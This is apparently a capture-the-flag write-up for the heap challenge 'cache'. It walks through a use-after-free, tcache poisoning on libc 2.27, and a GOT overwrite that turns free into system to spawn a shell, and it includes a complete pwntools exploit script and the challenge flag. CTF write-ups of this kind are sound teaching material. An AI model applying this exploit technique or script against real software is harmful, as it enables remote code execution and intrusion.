# cache

## Challenge

We're given a libc and a binary.

Starting the challenge, we get the following menu:

```
MENU
1: Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user

Choice:
```

There appears to be a win function that will execute `cat flag.txt`:

```asm
[0x00400720]> pdf @ sym.getFlag 
            ; DATA XREF from main @ 0x40097a
┌ 43: sym.getFlag ();
│           0x0040084a      55             push rbp
│           0x0040084b      4889e5         mov rbp, rsp
│           0x0040084e      b900000000     mov ecx, 0
│           0x00400853      488d15ee0200.  lea rdx, str.flag.txt       ; 0x400b48 ; "flag.txt"
│           0x0040085a      488d35f00200.  lea rsi, [0x00400b51]       ; "cat"
│           0x00400861      488d3de90200.  lea rdi, [0x00400b51]       ; "cat"
│           0x00400868      b800000000     mov eax, 0
│           0x0040086d      e89efeffff     call sym.imp.execlp
│           0x00400872      90             nop
│           0x00400873      5d             pop rbp
└           0x00400874      c3             ret
```

## Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'
```

## Solution

Let's look at the "Delete admin" and "Delete user" branches:

Delete admin:

```c
if (var_1ch == 6) {
    sym.imp.free(ptr);
}
```

Delete user:

```c
if (var_1ch == 7) {
    sym.imp.free(buf);
}
```

We can see that the pointers not cleared, resulting in dangling pointers.
There is also no check for whether the pointers are valid before they are read or written to.
This gives us a UAF vulnerability.

### Read fake flag

The admin struct contains 2 function pointers:

```c
if (var_1ch != 1) break;
ptr = (void *)sym.imp.malloc(0x10);
*(code **)((int64_t)ptr + 8) = sym.admin_info;
*(code **)ptr = sym.getFlag;
```

One to `admin_info` and one to `getFlag`.

We can only call `sym.admin_info` normally, using the "Print admin info" option.
However, note that the user and admin structs are the same size.
If we free the admin then allocate a user, it will occupy the same space on the heap.
Now both pointers share the same buffer.

When we are prompted for a name, or using the "Edit Student Name" option, we can write whatever we
want to the admin function pointers.

If we write the `getFlag` function pointer to `*(ptr + 8)` and use "Print admin info", the program
executes `cat flag.txt` and we get the following response:

```py
-> % ./exploit.py
[*] '/home/debian/challenges/cache/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'
[+] Opening connection to 34.159.7.96 on port 32552: Done
[*] Switching to interactive mode
Try Harder!!! https://www.youtube.com/watch?v=dQw4w9WgXcQ
[*] Got EOF while reading in interactive
```

So `flag.txt` contains a fake flag.
To find the real flag, we need to be able to execute arbitrary commands, so let's spawn a shell.

### Spawn shell and read real flag

The challenge uses libc 2.27, which is shortly after tcache was introduced.
Tcache bins are short singly-linked lists of freed chunks of equal sizes and there are no checks
when unlinking items.

By allocating a user and admin, then freeing both, the first one to be freed will have a pointer
to the second.
By freeing the user first, we will have a pointer that we can edit using the "Edit Student Name"
option.
We can make this point at any address we want to write to, such as the GOT entry for `free`.
By allocating 2 chunks now, the second will be placed at the address we chose.

Before we make these allocations, however, we need a "/bin/sh" string at one of our pointers to
make a GOT overwrite useful.
We can do so by allocating then freeing an admin chunk, then allocating a user chunk.
This will cause both pointers to point at the same heap struct.
We can use the user methods now to write "/bin/sh" at the pointer.

Now, without freeing the previous chunk, we allocate another chunk which will be placed at the GOT
entry of `free`.
We can use this and the "Print Student Name" address to leak the address of `free` and calculate
the libc address.
Then we use the "Edit Student Name" option to overwrite the GOT entry to `system`.
Lastly, we free the admin chunk to execute `system("/bin/sh")`.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 34.159.129.6 --port 32722 vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '34.159.7.96'
port = int(args.PORT or 32552)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'./'

io = start()

# create and free 2 chunks to get a forward pointer
io.sendlineafter(b"Choice: ", b"1")
io.sendlineafter(b"Choice: ", b"2")
io.sendafter(b"What is your name: ", b"a")
io.sendlineafter(b"Choice: ", b"6")
io.sendlineafter(b"Choice: ", b"7")

# change forward pointer to overwrite target
io.sendlineafter(b"Choice: ", b"4")
io.sendafter(b"What is your name: ", pack(exe.got['free']))

# overlap admin and user chunks and write "/bin/sh"
io.sendlineafter(b"Choice: ", b"1")
io.sendlineafter(b"Choice: ", b"6")
io.sendlineafter(b"Choice: ", b"2")
io.sendafter(b"What is your name: ", b"/bin/sh\x00")

# allocate chunk in GOT
io.sendlineafter(b"Choice: ", b"2")
io.sendafter(b"What is your name: ", b"a")

# print libc address
io.sendlineafter(b"Choice: ", b"5")
io.recvuntil(b"Students name is ")
leak = io.recvuntil(b"\n", drop=True).ljust(8, b'\x00')
libc.address = (unpack(leak) & 0xffffffffffffff00) - (libc.sym['free'] & 0xffffffffffffff00)
io.success("libc : " + hex(libc.address))

# change free GOT entry to system
io.sendlineafter(b"Choice: ", b"4")
io.sendafter(b"What is your name: ", pack(libc.sym['system']))

# call system("/bin/sh")
io.sendlineafter(b"Choice: ", b"6")

io.interactive()
```

## Flag

```
CTF{ab7bdaa3e5ed17ed326fef624a2d95d6ea62caa3dba6d1e5493936c362eed40e}
```
